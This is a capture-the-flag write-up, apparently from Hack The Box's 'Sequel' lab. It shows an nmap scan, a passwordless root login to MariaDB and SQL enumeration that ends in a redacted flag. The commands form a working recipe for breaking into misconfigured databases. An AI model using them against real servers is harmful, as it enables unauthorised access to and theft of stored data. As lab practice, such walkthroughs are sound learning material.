>[!tldr] Sequel is a very easy Linux machine that introduces a vulnerable #MySQL service misconfigured to allow access without a password. The machine showcases how to enumerate and interact with the database through SQL queries to extract critical information.

# Adventure Mode
---

1. Starting off with a top ports nmap scan
	1. `nmap 10.129.95.232 -p- -sT --stats-every=5s` 
		-> port `3306` : mysql
	2. `sudo nmap 10.129.95.232 -p3306 -sCV --stats-every=5s`: Is taking a very long time to load so im going to skip to enumerating `mysql` while it loads
2. I then decided to try to login to the `mysql` and found that default creds are "root" with no password so I tried that and it worked. Then i ran "help" to get more info on commands. Below are commands i've ran and tried with my thought process
``` shell
❯ mysql -u root -h 10.129.95.232 -P 3306 -p
<...Connected Successful...>

MariaDB [(none)]> ls 
- This breaks the shell. To leave run "\c"
  
MariaDB [(none)]> help
- I got more info on commands
  
MariaDB [(none)]> status
- Confirms im root, i also notice im not connected to a database
  
MariaDB [(none)]> use flag
- A vain attempt to connect to a flag database
  
MariaDB [(none)]> system ls
- Ok so this is how you run it like a shell! alternative: \!
- Correction... After seeing the directories i realized its my own shell T_T
  
MariaDB [(none)]> help 2
- I was running out of commands to try so i did a hail mary, i didnt get what i want but i did get 
"Please try to run 'help contents' for a list of all accessible topics"

MariaDB [(none)]> help contents
- Lots of more info I first read throught item "administration"
  
MariaDB [(none)]> SHOW DATABASES
Output:"     ->"
- I keep getting this weird inner shell thing, well after some research and review of the first help command i learn
- "Note that all text commands must be first on line and end with ';'"
- I have been running my commands wrong
  
MariaDB [(none)]> SHOW DATABASES;
+--------------------+
| Database           |
+--------------------+
| htb                |
| information_schema |
| mysql              |
| performance_schema |
+--------------------+
4 rows in set (0.073 sec)

MariaDB [(none)]> SHOW COLLATIONS;
- COLLATIONS are unicode rules and stuff, i didnt know that before hand
  
MariaDB [(none)]> SHOW COLUMNS;
ERROR 1064 (42000): You have an error in your SQL syntax;
- Hmm, i probably need to name a column? i then tried "*", "1", and "flag" as possible columns but nothing.
  
MariaDB [htb]> SHOW TABLES;
+---------------+
| Tables_in_htb |
+---------------+
| config        |
| users         |
+---------------+
- Ok cool, we know about the two tables, lets enumerate

MariaDB [htb]> SHOW TABLE users;
ERROR 1064 (42000): You have an error in your SQL syntax;

MariaDB [htb]> SHOW TABLE status;
- Lots of info, i noticed this, but its probably not important COLLATION:utf8mb4_general_ci. Then rows and row length are different for each table
  
MariaDB [htb]> SHOW COLUMNS;
ERROR 1064 (42000)
MariaDB [htb]> SHOW COLUMN users;
ERROR 1064 (42000)
MariaDB [htb]> use table users;
ERROR 1049 (42000): Unknown database 'table'

```

3. Im going to enumerate more once i understand how databases, tables, columns, users and all of this works
	 - View tables: `DESCRIBE <table>;`
	 - Retrieve info from a table: `SELECT <field> FROM <table>`
4. As i was learning i was running these commands in the background as practice, but these first two commands got me the flag!
```shell
MariaDB [htb]> describe config;
+-------+---------------------+------+-----+---------+----------------+
| Field | Type                | Null | Key | Default | Extra          |
+-------+---------------------+------+-----+---------+----------------+
| id    | bigint(20) unsigned | NO   | PRI | NULL    | auto_increment |
| name  | text                | YES  |     | NULL    |                |
| value | text                | YES  |     | NULL    |                |
+-------+---------------------+------+-----+---------+----------------+
3 rows in set (0.143 sec)

MariaDB [htb]> select value from config;
+----------------------------------+
| value                            |
+----------------------------------+
| 60s                              |
| default                          |
| false                            |
| 2M                               |
| [REDACTED_FLAG] |
| false                            |
| radius                           |
+----------------------------------+
7 rows in set (0.193 sec)
```
- Flag -> `[REDACTED_FLAG]`
